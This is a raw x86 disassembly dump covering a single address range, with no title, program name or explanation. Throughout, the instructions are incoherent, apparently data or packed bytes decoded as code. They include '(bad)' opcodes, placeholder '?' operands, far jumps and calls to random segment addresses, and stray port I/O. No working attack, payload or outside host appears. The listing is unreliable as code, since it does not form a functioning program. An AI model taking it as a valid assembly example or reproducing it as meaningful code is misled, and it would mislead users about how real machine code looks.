  422652:	adc    eax,0xf181df18
  422657:	mov    eax,ds:0x43e0b204
  42265c:	lahf   
  42265d:	push   0xffffffb2
  42265f:	pop    ds
  422660:	pop    edi
  422661:	pop    edi
  422662:	dec    edi
  422663:	pop    edi
  422664:	mov    edx,0x3220157a
  422669:	mov    al,0xb1
  42266b:	dec    esp
  42266c:	mov    al,0x79
  42266e:	cmp    BYTE PTR [ecx+0x5a72d540],0xe8
  422675:	mov    edi,0xb118caa
  42267a:	call   0x9aced0a0
  42267f:	push   0x1095c3bf
  422684:	aad    0x12
  422686:	cli    
  422687:	dec    ebp
  422688:	mov    edi,0x53fb34e4
  42268d:	mov    ah,0x64
  42268f:	sub    bl,ch
  422691:	cli    
  422692:	scas   al,BYTE PTR es:[edi]
  422693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422694:	cmp    eax,0x2a84e804
  422699:	jmp    0x42267b
  42269b:	mov    ecx,?
  42269d:	mov    bh,0xab
  42269f:	daa    
  4226a0:	xchg   ebx,eax
  4226a1:	or     BYTE PTR [ebp+0x5752d08b],0x68
  4226a8:	jmp    0xe2b7:0x6ac37a0f
  4226af:	jmp    0xc3abbbcc
  4226b4:	in     eax,0x64
  4226b6:	jmp    0x468c:0xa87de82e
  4226bd:	push   esi
  4226be:	sub    ecx,DWORD PTR [eax+0x58ac83c6]
  4226c4:	fistp  QWORD PTR [ecx-0x2a4eb2a7]
  4226ca:	mov    cl,0xa8
  4226cd:	sub    al,0x80
  4226cf:	push   eax
  4226d0:	sti    
  4226d1:	std    
  4226d2:	mov    dh,BYTE PTR [ebp+0x26e94c71]
  4226d8:	daa    
  4226d9:	push   ss
  4226da:	ret    0x332f
  4226dd:	jmp    0xb70ce8b1
  4226e2:	cwde   
  4226e3:	je     0x422681
  4226e5:	idiv   DWORD PTR [edi]
  4226e7:	loopne 0x4226d6
  4226e9:	jae    0x422753
  4226eb:	aad    0x63
  4226ed:	pushf  
  4226ee:	xor    DWORD PTR ds:0xbb55b3d0,ecx
  4226f4:	cmp    ebp,DWORD PTR [ebx]
  4226f6:	sbb    al,0x5
  4226f8:	xor    DWORD PTR gs:[ebx],ecx
  4226fb:	sti    
  4226fc:	adc    al,0x9b
  4226fe:	adc    al,0xc
  422700:	das    
  422701:	shr    DWORD PTR [ebp-0x51598e9],cl
  422707:	cwde   
  422708:	mov    ebx,0x5791c2be
  42270d:	call   0x68612c60
  422712:	into   
  422713:	dec    edi
  422714:	sub    al,0x69
  422716:	and    edx,DWORD PTR [ecx]
  422718:	xor    ebx,ebp
  42271a:	jb     0x422700
  42271c:	repnz test eax,0x7f311d70
  422722:	cmp    edx,DWORD PTR [edx]
  422724:	mov    eax,0x6e8faf14
  422729:	lock or DWORD PTR [ebx],eax
  42272c:	out    dx,al
  42272d:	aaa    
  42272e:	add    bh,bh
  422730:	push   ds
  422731:	in     al,0xeb
  422733:	loop   0x4226e2
  422735:	div    BYTE PTR [ebx+0x73a93f04]
  42273b:	add    BYTE PTR [eax+0x273aa28],ch
  422741:	sub    al,0xaf
  422743:	xchg   ebx,eax
  422744:	stos   BYTE PTR es:[edi],al
  422745:	push   fs
  422747:	outs   dx,DWORD PTR ds:[esi]
  422748:	mov    ch,0x74
  42274a:	xchg   ebp,eax
  42274b:	pop    ebx
  42274c:	or     BYTE PTR [ebx-0x3e],bl
  42274f:	mov    BYTE PTR [edx+0x1f],al
  422752:	sahf   
  422753:	sbb    al,0xe5
  422755:	dec    ecx
  422756:	cmp    ah,al
  422758:	jp     0x4226f2
  42275a:	ret    
  42275b:	and    BYTE PTR [edi],al
  42275d:	xchg   DWORD PTR [esp+edi*2+0x8],ebx
  422761:	push   esp
  422762:	push   eax
  422763:	jmp    0x422766
  422765:	mov    al,0x90
  422767:	push   ds
  422768:	push   es
  422769:	daa    
  42276a:	lahf   
  42276b:	mov    ebx,0x5558312f
  422770:	xor    bl,dh
  422772:	aas    
  422773:	pop    ss
  422774:	or     esp,DWORD PTR [eax+esi*2+0x24]
  422778:	stc    
  422779:	push   es
  42277a:	mov    al,0xdf
  42277c:	(bad)  
  42277d:	jmp    0x422781
  42277f:	pop    esp
  422780:	pop    esp
  422781:	les    edx,FWORD PTR [esi]
  422783:	jnp    0x4227d4
  422785:	jno    0x422798
  422787:	push   esp
  422788:	mov    eax,0x943cab38
  42278d:	call   0x98c5d74b
  422792:	mov    cs,WORD PTR [edi-0x24a40e07]
  422798:	test   ah,cl
  42279a:	sbb    eax,0x4add5263
  42279f:	fiadd  WORD PTR [ebx+0x71]
  4227a2:	inc    ebx
  4227a3:	rcl    DWORD PTR [edi],0x1
  4227a6:	test   eax,0xfdf8c3b9
  4227ab:	test   DWORD PTR [esi+ebp*4+0x17c79dc8],edx
  4227b2:	shr    DWORD PTR [ebp-0x5f],0x6c
  4227b6:	shl    BYTE PTR [eax+0x20],0x24
  4227ba:	(bad)  
  4227bc:	icebp  
  4227bd:	add    ch,dh
  4227bf:	mov    esi,0xe80032f7
  4227c4:	pop    DWORD PTR [edx+edx*8-0x77]
  4227c8:	or     al,0x8
  4227ca:	dec    ebp
  4227cb:	sbb    ebp,DWORD PTR [esi-0xd]
  4227ce:	fidivr DWORD PTR [esi+ebp*8]
  4227d1:	mov    al,ds:0x33bf9358
  4227d6:	jle    0x4227e6
  4227d8:	in     al,dx
  4227d9:	inc    ebx
  4227da:	push   esi
  4227db:	jae    0x42283a
  4227dd:	ja     0x422776
  4227df:	out    0x31,eax
  4227e1:	push   ebx
  4227e2:	pop    eax
  4227e3:	or     BYTE PTR [esi-0x5a],bh
  4227e6:	jbe    0x42282e
  4227e8:	jp     0x4227a6
  4227ea:	jp     0x422859
  4227ec:	cmp    eax,0x6020c7a6
  4227f1:	test   BYTE PTR [ecx],bh
  4227f3:	or     esi,DWORD PTR [ebx]
  4227f5:	sbb    eax,0xc4c39376
  4227fa:	(bad)  
  4227fb:	pop    esp
  4227fc:	or     DWORD PTR [ecx],ebp
  4227fe:	add    BYTE PTR [eax],0xe8
  422801:	dec    esi
  422802:	inc    ebp
  422803:	sub    DWORD PTR [esp+ecx*2],ebx
  422806:	sbb    cl,BYTE PTR ds:0x6453e359
  42280c:	push   ss
  42280d:	jo     0x42280b
  42280f:	adc    BYTE PTR [eax-0x76],al
  422812:	out    dx,eax
  422813:	out    dx,al
  422814:	test   al,0x35
  422816:	inc    esi
  422817:	rcr    DWORD PTR [eax],1
  422819:	dec    esp
  42281a:	dec    esp
  42281b:	mov    esi,DWORD PTR [eax+0x58c2e562]
  422821:	push   ebx
  422822:	int3   
  422823:	pop    ss
  422824:	push   ss
  422825:	push   eax
  422826:	mov    edx,0xe1899234
  42282b:	or     al,0x93
  42282d:	test   eax,ebp
  42282f:	push   ds
  422830:	cld    
  422831:	and    al,BYTE PTR [edx]
  422833:	pushf  
  422834:	les    esi,FWORD PTR [edx+0x38]
  422837:	push   0x3e3a57df
  42283c:	mov    ah,0xf
  42283e:	inc    ebx
  42283f:	push   ebx
  422840:	push   esp
  422841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422842:	pop    ecx
  422843:	push   ss
  422844:	or     al,0x3e
  422846:	test   dh,cl
  422848:	push   ebp
  422849:	inc    esi
  42284a:	lods   al,BYTE PTR fs:[esi]
  42284c:	or     edx,DWORD PTR [ebx]
  42284e:	mov    al,0x71
  422850:	push   esp
  422851:	and    al,BYTE PTR [esi-0x2c]
  422854:	add    DWORD PTR [ebx],0x4a
  422857:	cmp    ecx,eax
  422859:	out    dx,eax
  42285a:	push   es
  42285b:	push   edi
  42285c:	call   0xf290:0x14e071ee
  422863:	mov    bl,0x24
  422865:	ja     0x422872
  422867:	or     al,0x89
  422869:	sbb    ebx,DWORD PTR [ebp+0x7ee8f20b]
  42286f:	fdiv   st,st(7)
  422871:	jmp    0x422846
  422873:	mov    ds:0x669732e6,eax
  422878:	imul   edi,DWORD PTR [ecx-0x41],0x579e4d
  42287f:	and    BYTE PTR [edx+ebp*1+0x1d8ba371],ah
  422886:	fs jg  0x4228af
  422889:	test   DWORD PTR [edi],esi
  42288b:	push   edi
  42288c:	push   edx
  42288d:	lahf   
  42288e:	add    bh,BYTE PTR [ecx+0x22]
  422891:	mov    bh,0x1d
  422893:	ds ins DWORD PTR es:[edi],dx
  422895:	mov    edx,0xff4d0583
  42289a:	fcom   QWORD PTR [esi-0x17280826]
  4228a0:	mov    dl,BYTE PTR [edi]
  4228a2:	push   cs
  4228a3:	lods   ax,WORD PTR ds:[esi]
  4228a5:	out    dx,eax
  4228a6:	pop    edx
  4228a7:	and    ebp,edx
  4228a9:	call   0xa47c:0xd9f42b53
  4228b0:	adc    ebp,DWORD PTR [ecx-0x75]
  4228b3:	mov    ebx,0x892ea949
  4228b8:	mov    ebx,edx
  4228ba:	and    eax,0x21576266
  4228bf:	retf   
  4228c0:	add    eax,0xd68a9d2a
  4228c5:	sahf   
  4228c6:	pop    eax
  4228c7:	dec    ebp
  4228c8:	push   esi
  4228c9:	std    
  4228ca:	lea    esi,[eax]
  4228cc:	jle    0x4228f3
  4228ce:	jno    0x4228c9
  4228d0:	test   al,0x7c
  4228d2:	imul   ecx,ecx,0xffffffd6
  4228d5:	pop    ss
  4228d6:	sub    DWORD PTR [ebx],eax
  4228d8:	xor    edi,ebp
  4228da:	fist   DWORD PTR [eax-0x1de90c35]
  4228e0:	pop    DWORD PTR [ebp-0x62061685]
  4228e6:	push   eax
  4228e7:	adc    DWORD PTR [ebx+eax*2],edi
  4228ea:	add    DWORD PTR [ecx+0x6e42ce45],ecx
  4228f0:	sub    esp,DWORD PTR [edx+0x7a796597]
  4228f6:	jne    0x4228c6
  4228f8:	cld    
  4228f9:	dec    edx
  4228fa:	pop    esi
  4228fb:	rcr    ecx,1
  4228fd:	and    DWORD PTR [ebx+0x38],ecx
  422900:	cmp    al,0xe9
  422902:	hlt    
  422903:	pusha  
  422904:	aad    0xdf
  422906:	mov    bl,0x5b
  422908:	call   0x7fd8:0xa7fa9d87
  42290f:	mov    ds:0x9e246cc2,eax
  422914:	ins    BYTE PTR es:[edi],dx
  422915:	dec    eax
  422916:	fcomp  QWORD PTR [ebx]
  422918:	je     0x422911
  42291a:	pop    edx
  42291b:	and    eax,0x4ab9edf6
  422920:	lahf   
  422921:	ins    BYTE PTR es:[edi],dx
  422922:	adc    eax,0x381fc146
  422927:	ins    DWORD PTR es:[edi],dx
  422928:	lods   al,BYTE PTR ds:[esi]
  422929:	test   al,0xc9
  42292b:	mov    al,ds:0xc2713740
  422930:	push   edi
  422931:	mov    eax,0xc4bffd3b
  422936:	jge    0x422997
  422938:	pusha  
  422939:	push   ds
  42293a:	dec    ecx
  42293b:	mov    ds:0x65fecdfd,al
  422940:	mov    ch,0xb7
  422942:	jmp    DWORD PTR [eax+0x744012a6]
  422948:	aas    
  422949:	mov    ds:0xb5231510,al
  42294e:	iret   
  42294f:	inc    edx
  422950:	in     al,dx
  422951:	mov    ds:0xc58e495b,al
  422956:	mov    al,0x76
  422958:	or     dh,bh
  42295a:	scas   al,BYTE PTR es:[edi]
  42295b:	cdq    
  42295c:	test   esi,esi
  42295e:	pushf  
  42295f:	sbb    al,0x34
  422961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422962:	mov    ds:0xc7fc372f,eax
  422967:	xor    BYTE PTR [esi-0x598f762d],bh
  42296d:	xchg   DWORD PTR [edi-0x2d],ecx
  422970:	fnstsw WORD PTR [edx-0x45796395]
  422976:	leave  
  422977:	dec    edi
  422978:	push   esp
  422979:	fistp  WORD PTR ds:0xf96a1628
  42297f:	inc    edi
  422980:	ret    0x82c2
  422983:	jb     0x4229f8
  422985:	cmp    al,0xf7
  422987:	xor    al,0xef
  422989:	xchg   esi,eax
  42298a:	jo     0x42297a
  42298c:	and    edx,DWORD PTR gs:[esi+0x51a970d3]
  422993:	or     BYTE PTR [edi],al
  422995:	stc    
  422996:	dec    esp
  422997:	out    dx,al
  422998:	sqrtps xmm4,XMMWORD PTR [ecx-0x49]
  42299c:	scas   eax,DWORD PTR es:[edi]
  42299d:	and    al,0x17
  42299f:	mov    ebp,ss
  4229a1:	stos   BYTE PTR es:[edi],al
  4229a2:	ret    
  4229a3:	and    al,0x90
  4229a5:	and    BYTE PTR [edi],0x2e
  4229a8:	sub    eax,0xb13db5c5
  4229ad:	(bad)  
  4229ae:	lock cwde 
  4229b0:	mov    ch,BYTE PTR [edx-0x628d39b9]
  4229b6:	les    eax,FWORD PTR [edi]
  4229b8:	fcomp  st(7)
  4229ba:	shl    BYTE PTR [edi-0x2a0cdf3],1
  4229c0:	outs   dx,BYTE PTR ds:[esi]
  4229c1:	mov    ds:0xae0026b4,al
  4229c6:	pop    esi
  4229c7:	mov    fs,WORD PTR [ecx-0x23]
  4229ca:	cmp    eax,0xabf51047
  4229cf:	ds (bad) 
  4229d1:	jmp    0x4229f5
  4229d3:	jg     0x422a0d
  4229d5:	outs   dx,BYTE PTR ds:[esi]
  4229d6:	push   0x79
  4229d8:	xchg   ebx,eax
  4229d9:	push   ecx
  4229da:	cmp    BYTE PTR [edi-0x175a206e],dl
  4229e0:	inc    edi
  4229e1:	and    DWORD PTR [edx-0x1c360d4e],eax
  4229e7:	clc    
  4229e8:	pop    eax
  4229e9:	fiadd  WORD PTR [ecx+0x19afed8]
  4229ef:	ret    0xeaa8
  4229f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229f3:	mov    WORD PTR [ecx],?
  4229f5:	sbb    edi,DWORD PTR [ebp-0x2fd529ff]
  4229fb:	ja     0x4229dc
  4229fd:	or     DWORD PTR [ebx-0x3a],esp
  422a00:	outs   dx,BYTE PTR gs:[esi]
  422a02:	cwde   
  422a03:	push   esi
  422a04:	loope  0x422a54
  422a06:	scas   eax,DWORD PTR es:[edi]
  422a07:	push   edx
  422a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a09:	test   DWORD PTR [edi],esi
  422a0b:	push   0x111b18a9
  422a10:	jg     0x4229a1
  422a12:	dec    esi
  422a13:	adc    DWORD PTR [ebx+0x3e],edi
  422a16:	and    al,0x8e
  422a18:	pop    ebx
  422a19:	mov    esp,0x886661a3
  422a1e:	xchg   BYTE PTR [eax],ah
  422a20:	shr    DWORD PTR [eax+ebx*2-0xf],0x15
  422a25:	mov    al,0x84
  422a27:	or     al,0x52
  422a29:	xchg   esp,eax
  422a2a:	jo     0x422aa6
  422a2c:	cmp    bl,BYTE PTR [edx+0x5d]
  422a2f:	sbb    al,0x93
  422a31:	jns    0x422a10
  422a33:	cmp    eax,eax
  422a35:	and    ch,BYTE PTR [ecx-0x42]
  422a38:	fist   DWORD PTR [edi+0x3f06959f]
  422a3e:	sbb    esi,DWORD PTR [edx-0x40]
  422a41:	pop    ds
  422a42:	mov    BYTE PTR [edx+0x27],dl
  422a45:	push   esi
  422a46:	push   cs
  422a47:	pusha  
  422a48:	push   cs
  422a49:	xchg   ebx,eax
  422a4a:	repz mov ds:0xa17cd530,al
  422a50:	mov    al,0x52
  422a52:	or     ah,BYTE PTR [edx+0x2000009c]
  422a58:	and    eax,0x36551dc5
  422a5d:	jne    0x422aa8
  422a5f:	push   ss
  422a60:	(bad)  
  422a61:	fimul  WORD PTR [eax]
  422a63:	jecxz  0x4229ed
  422a65:	pop    ecx
  422a66:	push   esp
  422a67:	pop    ss
  422a68:	inc    edi
  422a69:	sub    bh,BYTE PTR [ebx]
  422a6b:	dec    esi
  422a6c:	add    ebx,DWORD PTR [esi]
  422a6e:	jbe    0x422a69
  422a70:	rol    edi,1
  422a72:	shr    DWORD PTR [ecx+edx*8+0x7f],0x98
  422a77:	sub    al,0x7f
  422a79:	retf   
  422a7a:	cli    
  422a7b:	mov    ebx,0x816d5be5
  422a80:	popf   
  422a81:	sub    DWORD PTR ds:0x142c1ef4,ebp
  422a87:	sub    eax,0x9a387213
  422a8c:	in     al,dx
  422a8d:	retf   
  422a8e:	pop    ds
  422a8f:	in     al,0x80
  422a91:	(bad)  
  422a94:	aad    0xfe
  422a96:	je     0x422ada
  422a98:	cmp    al,0xf4
  422a9a:	rcr    ah,cl
  422a9c:	sahf   
  422a9d:	dec    edx
  422a9e:	xor    eax,0x7bff3b4f
  422aa3:	stos   DWORD PTR es:[edi],eax
  422aa4:	cli    
  422aa5:	add    eax,0x969a6f99
  422aaa:	add    al,0xcd
  422aac:	pop    esp
  422aad:	das    
  422aae:	fs push ss
  422ab0:	mov    ecx,0xc4a90403
  422ab5:	lds    edx,FWORD PTR [ebx]
  422ab7:	popa   
  422ab8:	leave  
  422ab9:	jmp    0x422b38
  422abb:	call   0x9ca9afa9
  422ac0:	arpl   cx,di
  422ac2:	rcl    BYTE PTR es:[ecx],cl
  422ac5:	jmp    0xe684:0x17e7c8dd
  422acc:	xchg   esp,eax
  422acd:	sahf   
  422ace:	sbb    BYTE PTR [edx],0x63
  422ad1:	(bad)  
  422ad2:	(bad)  
  422ad3:	and    DWORD PTR [edx-0x236f919f],ebx
  422ad9:	adc    eax,0xbad1112
  422ade:	data16 outs dx,BYTE PTR ds:[esi]
  422ae0:	sub    ebx,DWORD PTR [ecx-0x47]
  422ae3:	out    dx,al
  422ae4:	in     al,0xfe
  422ae6:	leave  
  422ae7:	mov    ecx,DWORD PTR ds:0xbc3a1f56
  422aed:	scas   al,BYTE PTR es:[edi]
  422aee:	sbb    DWORD PTR [ebx],edx
  422af0:	cwde   
  422af1:	sbb    BYTE PTR [eax+0x690fb7b3],ah
  422af7:	adc    dh,al
  422af9:	shl    DWORD PTR [eax+esi*4],1
  422afc:	std    
  422afd:	dec    esp
  422afe:	jp     0x422b60
  422b00:	sbb    BYTE PTR [eax-0x5d],dl
  422b03:	pop    esi
  422b04:	je     0x422afc
  422b06:	pushf  
  422b07:	cmp    al,0xed
  422b09:	mov    dh,0x5f
  422b0b:	jl     0x422b58
  422b0d:	mov    ah,0xf2
  422b0f:	call   0x44d1:0x87f4b428
  422b16:	sub    al,0x3a
  422b18:	stos   DWORD PTR es:[edi],eax
  422b19:	pop    ecx
  422b1a:	mov    ah,0x99
  422b1c:	or     al,0xf4
  422b1e:	sbb    BYTE PTR [ebp+0x36],0xdb
  422b22:	push   esi
  422b23:	xchg   edi,eax
  422b24:	xlat   BYTE PTR ds:[ebx]
  422b25:	mov    esi,0xe47fc0e
  422b2a:	push   0x3c
  422b2c:	lods   al,BYTE PTR ds:[esi]
  422b2d:	mov    cl,0x8c
  422b2f:	adc    BYTE PTR [edx],dl
  422b31:	sti    
  422b32:	mov    ds:0xf4973f1b,eax
  422b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b38:	xlat   BYTE PTR ds:[ebx]
  422b39:	xor    BYTE PTR [edi-0x2fc9c9a5],ah
  422b3f:	imul   edx,DWORD PTR ds:[esi+0x3db35161],0x6e6f88b0
  422b4a:	repz inc eax
  422b4c:	mov    ds:0x9f21445b,eax
  422b51:	mov    cl,0xf7
  422b53:	sti    
  422b54:	jmp    0xb618e514
  422b59:	jl     0x422b6a
  422b5b:	xchg   ebx,eax
  422b5c:	jp     0x422b61
  422b5e:	pop    edi
  422b5f:	(bad)  
  422b60:	jle    0x422b62
  422b62:	(bad)  
  422b63:	xlat   BYTE PTR ds:[ebx]
  422b64:	cmp    BYTE PTR ds:0xb7580e9e,0x4f
  422b6b:	inc    eax
  422b6c:	xchg   esi,eax
  422b6d:	and    edi,DWORD PTR [esi]
  422b6f:	fsubr  st(0),st
  422b71:	inc    esi
  422b72:	loop   0x422bdf
  422b74:	in     eax,0x9d
  422b76:	out    dx,al
  422b77:	mov    ebx,0x67d66c19
  422b7c:	rcl    BYTE PTR [esi+esi*4-0x624078ec],1
  422b83:	ss fld st(3)
  422b86:	xchg   esp,eax
  422b87:	pop    edi
  422b88:	icebp  
  422b89:	das    
  422b8a:	enter  0x2673,0x1c
  422b8e:	mov    ecx,0x6f2eb765
  422b93:	pop    ss
  422b94:	lea    esi,[ecx+0x1891c145]
  422b9a:	pop    esp
  422b9b:	lds    esi,FWORD PTR [eax+0x5dfdaa0c]
  422ba1:	xor    esi,esp
  422ba3:	mov    ecx,0x18ff1513
  422ba8:	sbb    dl,bh
  422baa:	mov    gs,WORD PTR [edi-0x6f79cd49]
  422bb0:	ds push eax
  422bb2:	pop    ecx
  422bb3:	ret    0xb8b8
  422bb6:	mov    edx,0x291f6354
  422bbb:	ss icebp 
  422bbd:	shl    DWORD PTR [ecx-0x2bf71ca8],cl
  422bc3:	sbb    DWORD PTR [ecx],ebx
  422bc5:	lock pop ebp
  422bc7:	mov    edx,0x518f5642
  422bcc:	adc    DWORD PTR [eax],edx
  422bce:	pop    edx
  422bcf:	leave  
  422bd0:	outs   dx,DWORD PTR ds:[esi]
  422bd1:	sbb    eax,0xbed729ff
  422bd6:	cmp    eax,0xd464e1e4
  422bdb:	xchg   ecx,eax
  422bdc:	mov    eax,0xc5241284
  422be1:	scas   al,BYTE PTR es:[edi]
  422be2:	cdq    
  422be3:	push   edi
  422be4:	mov    bh,0x58
  422be6:	adc    esi,ebp
  422be8:	inc    edi
  422be9:	pop    ecx
  422bea:	es adc esi,ebp
  422bed:	es cli 
  422bef:	sub    bl,BYTE PTR [esi+0x74c01dfa]
  422bf5:	jg     0x422c6c
  422bf7:	jmp    0x8896:0xe4c1dac
  422bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bff:	mov    ecx,0x894ffe4a
  422c04:	imul   eax,DWORD PTR [esi-0x70bfe3bd],0xdca314bf
  422c0e:	and    BYTE PTR ds:0x28d52924,cl
  422c14:	mov    dh,0xbc
  422c16:	xchg   edi,eax
  422c17:	cmp    BYTE PTR [edx+0x3aa56cde],bl
  422c1d:	jmp    0xd4c993cf
  422c22:	jbe    0x422c5d
  422c24:	sahf   
  422c25:	nop
  422c26:	pop    es
  422c27:	push   cs
  422c28:	rcl    DWORD PTR [eax+0x29e99ec3],0xfc
  422c2f:	ss into 
  422c31:	adc    eax,edx
  422c33:	mov    eax,0x3fa3f335
  422c38:	popa   
  422c39:	sti    
  422c3a:	inc    eax
  422c3b:	sar    DWORD PTR [esi],cl
  422c3d:	nop
  422c3e:	jle    0x422c61
  422c40:	xchg   edi,eax
  422c41:	mov    edx,0x6194f703
  422c46:	xlat   BYTE PTR ds:[ebx]
  422c47:	jmp    FWORD PTR [ebp-0x71]
  422c4a:	mov    ah,0xbb
  422c4c:	push   0x4c
  422c4e:	pop    ecx
  422c4f:	xchg   esi,eax
  422c50:	dec    ecx
  422c51:	add    ch,al
  422c53:	ja     0x422c1c
  422c55:	and    DWORD PTR [eax+0xd],esp
  422c58:	push   eax
  422c59:	(bad)  
  422c5a:	enter  0xc5d4,0x30
  422c5e:	push   ebp
  422c5f:	pushf  
  422c60:	or     al,0xb5
  422c62:	add    ebx,esi
  422c64:	xor    ebp,DWORD PTR [ecx]
  422c66:	inc    edx
  422c67:	mov    dl,0xf9
  422c69:	dec    ebp
  422c6a:	daa    
  422c6b:	pushf  
  422c6c:	fistp  WORD PTR [esi+0x7c19c398]
  422c72:	aas    
  422c73:	sbb    al,0x2a
  422c75:	pmulhuw mm2,QWORD PTR [edx-0x14a2de67]
  422c7c:	loope  0x422c57
  422c7e:	fisub  DWORD PTR [edx]
  422c80:	push   edi
  422c81:	mov    esp,0x90dcd7cc
  422c86:	xchg   edx,eax
  422c87:	or     BYTE PTR [esi],ch
  422c89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c8a:	adc    eax,0x1ca6dff9
  422c8f:	mov    ebx,0x62eaa191
  422c94:	(bad)  [edx]
  422c96:	mov    ch,al
  422c98:	mov    esp,0xbee41468
  422c9d:	in     al,dx
  422c9e:	push   es
  422c9f:	xchg   edx,eax
  422ca0:	loopne 0x422ca0
  422ca2:	and    al,0x95
  422ca4:	enter  0x62b0,0x8e
  422ca8:	scas   eax,DWORD PTR es:[edi]
  422ca9:	test   DWORD PTR [edi-0x7ab9f75d],esi
  422caf:	in     al,dx
  422cb0:	mov    edx,edi
  422cb2:	pop    eax
  422cb3:	push   esp
  422cb4:	outs   dx,DWORD PTR ds:[esi]
  422cb5:	mov    al,0x60
  422cb7:	call   0x913b:0x9a6f43d7
  422cbe:	and    al,BYTE PTR [ecx+0x69]
  422cc1:	xlat   BYTE PTR ds:[ebx]
  422cc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cc3:	outs   dx,BYTE PTR ds:[esi]
  422cc4:	aad    0x60
  422cc6:	ds pushf 
  422cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cca:	(bad)  
  422ccc:	cmc    
  422ccd:	bound  ebp,QWORD PTR [eax+ecx*4-0x6b]
  422cd1:	ret    
  422cd2:	pop    edi
  422cd3:	call   0x26447b71
  422cd8:	bts    DWORD PTR [eax-0x53843369],ebx
  422cdf:	lahf   
  422ce0:	cs aaa 
  422ce2:	inc    esi
  422ce3:	pop    ss
  422ce4:	mov    bl,BYTE PTR [edx+0x58]
  422ce7:	push   ss
  422ce8:	jle    0x422d2c
  422cea:	stc    
  422ceb:	mov    cl,BYTE PTR [ecx]
  422ced:	sbb    al,0x6d
  422cef:	call   0x73a759a4
  422cf4:	imul   edx,DWORD PTR [ebx-0x720256f7],0xd977f543
  422cfe:	xor    eax,0x9567d0c3
  422d03:	jge    0x422d68
  422d05:	mov    dl,0x12
  422d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d08:	fisub  WORD PTR [ecx]
  422d0a:	xchg   esi,eax
  422d0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d0c:	cmp    DWORD PTR [esi-0x43],eax
  422d0f:	cmp    esi,DWORD PTR [edi+0x2438225a]
  422d15:	mov    ds,WORD PTR [ebx-0x3b]
  422d18:	fs lahf 
  422d1a:	pop    ecx
  422d1b:	ror    BYTE PTR [ebx+edi*4],cl
  422d1e:	or     ebp,eax
  422d20:	aam    0xf8
  422d22:	mov    ecx,0x32315700
  422d27:	sahf   
  422d28:	xor    dl,BYTE PTR [edi-0x63]
  422d2b:	out    dx,al
  422d2c:	xor    edi,DWORD PTR [ecx+0x72]
  422d2f:	cli    
  422d30:	es fwait
  422d32:	dec    esp
  422d33:	jns    0x422d48
  422d35:	loopne 0x422d7e
  422d37:	fimul  WORD PTR [edi-0x34]
  422d3a:	cli    
  422d3b:	push   edx
  422d3c:	cmp    DWORD PTR [edx+0x6a],ebp
  422d3f:	mov    dh,0x53
  422d41:	fadd   DWORD PTR [esi+0x37]
  422d44:	daa    
  422d45:	das    
  422d46:	add    DWORD PTR [esi+eax*8+0x54],edx
  422d4a:	adc    BYTE PTR [edx-0x3d],ch
  422d4d:	lods   eax,DWORD PTR ds:[esi]
  422d4e:	imul   esp,DWORD PTR [eax+0xb],0x30
  422d52:	jno    0x422d6c
  422d54:	mov    esi,0x65cb0a90
  422d59:	sar    DWORD PTR [ebx+0x2e],cl
  422d5c:	inc    ecx
  422d5d:	xor    al,0x60
  422d5f:	jo     0x422dc6
  422d61:	cmp    al,0x2
  422d63:	ds xchg ecx,edx
  422d66:	inc    eax
  422d67:	mov    WORD PTR [edx-0x3efa0fee],es
  422d6d:	xchg   esi,eax
  422d6e:	jecxz  0x422d3c
  422d70:	test   eax,0xddfde607
  422d75:	mov    edx,0xa2273cf6
  422d7a:	xchg   edi,eax
  422d7b:	push   edi
  422d7c:	les    ebp,FWORD PTR [eax-0x1603e831]
  422d82:	or     BYTE PTR [ebp-0x3d86b2fb],bl
  422d88:	xor    bl,BYTE PTR [esi-0x127924d1]
  422d8e:	push   ss
  422d8f:	adc    ah,ch
  422d91:	push   es
  422d92:	xor    al,0x44
  422d94:	sbb    DWORD PTR [edi+eiz*1],ecx
  422d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d98:	sti    
  422d99:	sbb    eax,0xf9b62cd3
  422d9e:	daa    
  422d9f:	es int 0xfc
  422da2:	xchg   esp,eax
  422da3:	mov    eax,0x2d9e6fc1
  422da8:	scas   al,BYTE PTR es:[edi]
  422da9:	sub    eax,ebp
  422dab:	aam    0xf7
  422dad:	(bad)  
  422dae:	push   ds
  422daf:	int3   
  422db0:	adc    eax,DWORD PTR [ecx-0x393ab37b]
  422db6:	push   ss
  422db7:	mov    eax,0x8490a104
  422dbc:	sar    BYTE PTR [ecx],cl
  422dbe:	sahf   
  422dbf:	shl    DWORD PTR [eax-0x35],0x27
  422dc3:	iret   
  422dc4:	inc    esp
  422dc5:	push   esp
  422dc6:	mov    edi,0x68733835
  422dcb:	or     esp,DWORD PTR [edx-0x1b75dc45]
  422dd1:	adc    al,BYTE PTR [edi-0x246a43cb]
  422dd7:	stos   BYTE PTR es:[edi],al
  422dd8:	aaa    
  422dd9:	dec    ebx
  422dda:	xlat   BYTE PTR ds:[ebx]
  422ddb:	pop    es
  422ddc:	add    esp,ecx
  422dde:	mov    dl,0x6c
  422de0:	add    edx,ecx
  422de2:	and    BYTE PTR [ebx+0x5fcffa59],cl
  422de8:	inc    ecx
  422de9:	sbb    eax,0xe53d5b5b
  422dee:	mov    cl,0x8e
  422df0:	shl    DWORD PTR [eax+0x53],0xbe
  422df4:	js     0x422dc8
  422df6:	xor    DWORD PTR [eax],esp
  422df8:	adc    al,0xbd
  422dfa:	es loop 0x422e6c
  422dfd:	rcl    DWORD PTR [edi],cl
  422dff:	mov    bh,0x8
  422e01:	jo     0x422de8
  422e03:	lds    ecx,FWORD PTR [esi+0x4374181]
  422e09:	add    esi,0xc5119c3b
  422e0f:	jmp    0xee58:0x4e96fd3a
  422e16:	(bad)  
